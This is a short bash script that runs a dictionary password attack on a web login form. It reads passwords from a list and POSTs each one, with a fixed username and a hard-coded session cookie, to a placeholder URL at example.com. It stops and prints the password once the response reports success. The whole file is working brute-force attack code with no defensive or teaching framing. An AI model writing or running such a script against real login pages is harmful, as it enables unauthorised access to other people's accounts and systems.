#!/usr/bin/env bash

main() {
    pwfile='passlist.txt'
    payload='formID=&username=hackeruser&txtInput=87679&website=&simple_spc=31503373534448-31503373534448&q3_requestid=0&password='
    posturl='http://example.com/restricted.php'
    n=0
    while read -r pass; do
        n=$((n+1))
        if curl -s -L -b "PHPSESSID=eorp7dp85fhfmul19molfr0gn2" --data "${payload}${pass}"  "$posturl" \
               | grep -i succeeded
        then
            printf 'Found after %s tries:\t%s\n' "$n" "$pass"
            return
        else
            printf 'Trying\t%s\t%s\n' "$n" "$pass"
	    
        fi

    done < "$pwfile"
}

main
